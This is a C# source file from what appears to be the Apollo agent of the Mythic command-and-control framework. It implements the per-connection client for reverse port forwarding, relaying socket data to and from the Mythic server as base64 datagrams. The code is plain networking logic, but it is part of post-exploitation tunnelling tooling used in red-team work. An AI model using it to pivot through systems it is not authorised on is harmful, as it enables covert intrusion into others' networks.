using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using TT = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Structs.MythicStructs;
using System.Net;
using ApolloInterop.Utils;
using System.Text;

namespace Apollo.Management.Rpfwd
{
    public class RpfwdClient
    {
        // Rpfwd Client will be created for each new connection to the bound port in the rpfwd task

        private AsyncTcpClient _client;
        private TcpClient _tcpClient;
        private IPAddress _addr;
        private int _port;

        private CancellationTokenSource _cts = new CancellationTokenSource();

        private AutoResetEvent _requestEvent = new AutoResetEvent(false);

        private Action<object> _sendRequestsAction;
        private TT.Task _sendRequestsTask = null;
        public int ID { get; private set; }
        private IAgent _agent;
        private Tasking _task;
        private int _debugLevel;
        private string _remoteConnectionString;

        private ConcurrentQueue<byte[]> _requestQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<byte[]> _receiveQueue = new ConcurrentQueue<byte[]>();

        public RpfwdClient(IAgent agent, TcpClient client, int serverId, int port, int debugLevel, Tasking task)
        {
            _agent = agent;
            _port = port;
            ID = serverId;
            _tcpClient = client;
            _task = task;
            _debugLevel = debugLevel;
            _remoteConnectionString = $"{_tcpClient.Client.RemoteEndPoint}";

            _sendRequestsAction = (object c) =>
            {
                TcpClient client = (TcpClient)c;
                while(!_cts.IsCancellationRequested && client.Connected)
                {
                    try
                    {
                        WaitHandle.WaitAny(new WaitHandle[] {_requestEvent, _cts.Token.WaitHandle});
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    if (!_cts.IsCancellationRequested && client.Connected && _requestQueue.TryDequeue(out byte[] result))
                    {
                        try
                        {
                            client.GetStream().BeginWrite(result, 0, result.Length, OnDataSent, c);
                        }
                        catch
                        {
                            break;
                        }
                    } else if (_cts.IsCancellationRequested || !client.Connected)
                    {
                        break;
                    }
                }
                client.Close();
            };
        }

        public void Exit()
        {
            _cts.Cancel();
            if (_sendRequestsTask != null)
                _sendRequestsTask.Wait();
        }
        public void Start()
        {
            _client = new AsyncTcpClient(_tcpClient);
            _client.ConnectionEstablished += OnConnect;
            _client.Disconnect += OnDisconnect;
            _client.MessageReceived += OnMessageReceived;

            _client.Connect();
        }
        private void OnConnect(object sender, TcpMessageEventArgs args)
        {
            args.State = this;
            _sendRequestsTask = new TT.Task(_sendRequestsAction, args.Client);
            _sendRequestsTask.Start();
            _agent.GetTaskManager().AddRpfwdDatagramToQueue(MessageDirection.ToMythic, new SocksDatagram()
            {
                ServerID = ID,
                Data = "",
                Exit = false,
                Port = _port
            });
            if(_debugLevel > 0)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - New Connection\nClient: {_remoteConnectionString}\n\n", false));
            }
        }

        private void OnDisconnect(object sender, TcpMessageEventArgs args)
        {
            _cts.Cancel();
            args.Client.Close();
            _sendRequestsTask.Wait();
            _agent.GetRpfwdManager().Remove(ID);
            if(_debugLevel > 0)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Closed Connection\nClient: {_remoteConnectionString}\n\n", false));
            }
        }

        private void OnDataSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            if (client.Connected && !_cts.IsCancellationRequested)
            {
                try
                {
                    client.GetStream().EndWrite(result);
                    // Potentially delete this since theoretically the sender Task does everything
                    if (_requestQueue.TryDequeue(out byte[] data))
                    {
                        client.GetStream().BeginWrite(data, 0, data.Length, OnDataSent, client);
                    }
                }
                catch (System.IO.IOException)
                {
                    
                }
            }
        }

        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
        {
            byte[] data = args.Data.Data.Take(args.Data.DataLength).ToArray();
            DebugHelp.DebugWriteLine($"Got data from client: {ID}, AddRpfwdDatagramToQueue");
            _agent.GetTaskManager().AddRpfwdDatagramToQueue(MessageDirection.ToMythic, new SocksDatagram()
            {
                ServerID = ID,
                Data = Convert.ToBase64String(data),
                Exit = false,
                Port = _port
            });
            if(_debugLevel >= 1)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Data ({data.Length} Bytes) From Remote Connection\n{Encoding.UTF8.GetString(data)}\n\n", false));
            }
        }

        
        public bool HandleDatagram(SocksDatagram dg)
        {
            byte[] data;
            bool bRet = false;
            try
            {
                data = Convert.FromBase64String(dg.Data);
            } catch (Exception ex)
            {
                // Console.WriteLine($"Invalid b64 data from Mythic: {ex.Message}");
                return bRet;
            }

            if (_client != null && !_sendRequestsTask.IsCompleted)
            {
                _requestQueue.Enqueue(data);
                _requestEvent.Set();
                bRet = true;
            }
            if(_debugLevel >= 2)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Data ({data.Length} Bytes) From Mythic Connection\n{Encoding.UTF8.GetString(data)}\n\n", false));
            }
            return bRet;
        }
    }
}
